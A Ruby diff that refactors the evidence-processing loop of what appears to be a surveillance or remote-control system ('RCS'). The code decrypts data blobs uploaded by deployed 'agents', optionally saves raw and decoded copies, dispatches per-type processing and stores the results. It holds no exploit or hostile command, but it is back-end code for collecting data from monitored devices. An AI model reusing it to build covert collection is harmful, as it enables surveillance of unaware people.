@@ -49,6 +49,102 @@ class InstanceProcessor
     # we need to calculate the MD5 and use it in binary form
     trace :debug, "Evidence key #{@agent['logkey']}"
     @key = Digest::MD5.digest @agent['logkey']
+
+    @process = Proc.new do
+      resume
+
+      until sleeping_too_much?
+        until @evidences.empty?
+          resume
+          evidence_id = @evidences.shift
+
+          begin
+            start_time = Time.now
+
+            # get binary evidence
+            data = RCS::DB::GridFS.get(BSON::ObjectId(evidence_id), "evidence")
+            raise "Empty evidence" if data.nil?
+
+            raw = data.read
+
+            if forwarding?
+              hash = Digest::SHA1.hexdigest(raw)
+              Dir.mkdir "forwarded" unless File.exists? "forwarded"
+              path = "forwarded/#{hash}.raw"
+              f = File.open(path, 'w') {|f| f.write raw}
+              trace :debug, "[#{evidence_id}] forwarded raw evidence #{evidence_id} to #{path}"
+            end
+
+            # deserialize binary evidence and forward decoded
+            evidences = begin
+              RCS::Evidence.new(@key).deserialize(raw) do |data|
+                if forwarding?
+                  path = "forwarded/#{evidence_id}.dec"
+                  f = File.open(path, 'w') {|f| f.write data}
+                  trace :debug, "[#{evidence_id}] forwarded decoded evidence #{evidence_id} to #{path}"
+                end
+              end
+            rescue EmptyEvidenceError => e
+              trace :info, "[#{evidence_id}] deleting empty evidence #{evidence_id}"
+              RCS::DB::GridFS.delete(BSON::ObjectId(evidence_id), "evidence")
+              next
+            rescue EvidenceDeserializeError => e
+              trace :warn, "[#{evidence_id}] decoding failed for #{evidence_id}: #{e.to_s}, deleting..."
+              RCS::DB::GridFS.delete(BSON::ObjectId(evidence_id), "evidence")
+              next
+            end
+
+            next if evidences.nil?
+
+            evidences.each do |ev|
+
+              next if ev.empty?
+
+              # store evidence_id inside evidence, we need it inside processors
+              ev[:db_id] = evidence_id
+
+              # store agent instance in evidence (used when storing into db)
+              ev[:instance] = @agent['instance']
+              ev[:ident] = @agent['ident']
+
+              trace :debug, "[#{evidence_id}] processing evidence of type #{ev[:type]}"
+
+              # find correct processing module and extend evidence
+              mod = "#{ev[:type].to_s.capitalize}Processing"
+              ev.extend eval(mod) if RCS.const_defined? mod.to_sym
+              ev.process if ev.respond_to? :process
+
+              # override original type
+              ev[:type] = ev.type
+
+              #store_evidence evidence
+              parsed = ev.store
+
+              #
+              # FORWARDER: forward&sign parsed evidence
+              #
+            end
+
+            processing_time = Time.now - start_time
+            trace :info, "[#{evidence_id}] processed #{ev[:type].upcase} for agent #{@agent['ident']} in #{processing_time} sec"
+
+          rescue Mongo::ConnectionFailure => e
+            trace :error, "[#{evidence_id}] cannot connect to database, retrying in 5 seconds ..."
+            sleep 5
+            retry
+          rescue Exception => e
+            trace :fatal, "FAILURE: " << e.to_s
+            trace :fatal, "EXCEPTION: " + e.backtrace.join("\n")
+          ensure
+            RCS::DB::GridFS.delete(BSON::ObjectId(evidence_id), "evidence")
+            trace :debug, "[#{evidence_id}] deleted raw evidence"
+          end
+        end
+        take_some_rest
+      end
+
+      put_to_sleep
+    end
     
     #@call_processor = CallProcessor.new
   end
@@ -85,106 +181,10 @@ class InstanceProcessor
   
   def queue(id)
     @evidences << id unless id.nil?
-    trace :info, "queueing evidence id #{id} for agent #{@agent['ident']}"
-    
-    process = Proc.new do
-      resume
-      
-      until sleeping_too_much?
-        until @evidences.empty?
-          resume
-          evidence_id = @evidences.shift
-
-          begin
-            start_time = Time.now
-            
-            # get binary evidence
-            data = RCS::DB::GridFS.get(BSON::ObjectId(evidence_id), "evidence")
-            raise "Empty evidence" if data.nil?
-            
-            raw = data.read
-            
-            if forwarding?
-              hash = Digest::SHA1.hexdigest(raw)
-              Dir.mkdir "forwarded" unless File.exists? "forwarded"
-              path = "forwarded/#{hash}.raw"
-              f = File.open(path, 'w') {|f| f.write raw}
-              trace :debug, "forwarded raw evidence #{evidence_id} to #{path}"
-            end
-            
-            # deserialize binary evidence and forward decoded
-            evidences = RCS::Evidence.new(@key).deserialize(raw) do |data|
-              if forwarding?
-                path = "forwarded/#{evidence_id}.dec"
-                f = File.open(path, 'w') {|f| f.write data}
-                trace :debug, "forwarded decoded evidence #{evidence_id} to #{path}"
-              end
-            end
-
-            if evidences.nil?
-              trace :debug, "error deserializing evidence #{evidence_id} for agent #{@agent['ident']}, skipping ..."
-              next
-            end
-            
-            trace :debug, "Processing #{evidences.length} evidence(s)."
-            
-            evidences.each do |evidence|
-
-              # store evidence_id inside evidence, we need it inside processors
-              evidence[:db_id] = evidence_id
-              
-              # delete empty evidences
-              if evidence.empty?
-                #RCS::EvidenceManager.instance.del_evidence(evidence.info[:db_id], @agent['instance'])
-                trace :debug, "deleted empty evidence for agent #{@agent['ident']}"
-                next
-              end
-              
-              # store agent instance in evidence (used when storing into db)
-              evidence[:instance] = @agent['instance']
-              evidence[:ident] = @agent['ident']
-              
-              trace :debug, "Processing evidence of type #{evidence[:type]}"
-              
-              # find correct processing module and extend evidence
-              mod = "#{evidence[:type].to_s.capitalize}Processing"
-              evidence.extend eval(mod) if RCS.const_defined? mod.to_sym
-              evidence.process if evidence.respond_to? :process
-              
-              # override original type
-              evidence[:type] = evidence.type
-              
-              #store_evidence evidence
-              parsed = evidence.store
-              
-              #
-              # FORWARDER: forward&sign parsed evidence
-              #
-              
-              processing_time = Time.now - start_time
-              trace :info, "processed #{evidence[:type].upcase} for agent #{@agent['ident']} in #{processing_time} sec"
-            end
-            
-            RCS::DB::GridFS.delete(BSON::ObjectId(evidence_id), "evidence")
-            trace :debug, "deleted raw evidence #{evidence_id}"
-            
-          rescue EvidenceDeserializeError => e
-            trace :warn, "[#{@agent['instance']}] decoding failed for #{evidence_id}: " << e.to_s
-            # trace :fatal, "EXCEPTION: " + e.backtrace.join("\n")
-          rescue Exception => e
-            trace :fatal, "FAILURE: " << e.to_s
-            trace :fatal, "EXCEPTION: " + e.backtrace.join("\n")
-          end
-        end
-        take_some_rest
-      end
-      
-      put_to_sleep
-    end
     
     if finished?
       trace :debug, "deferring work for #{@agent['instance']}"
-      EM.defer process
+      EM.defer @process
     end
   end
   
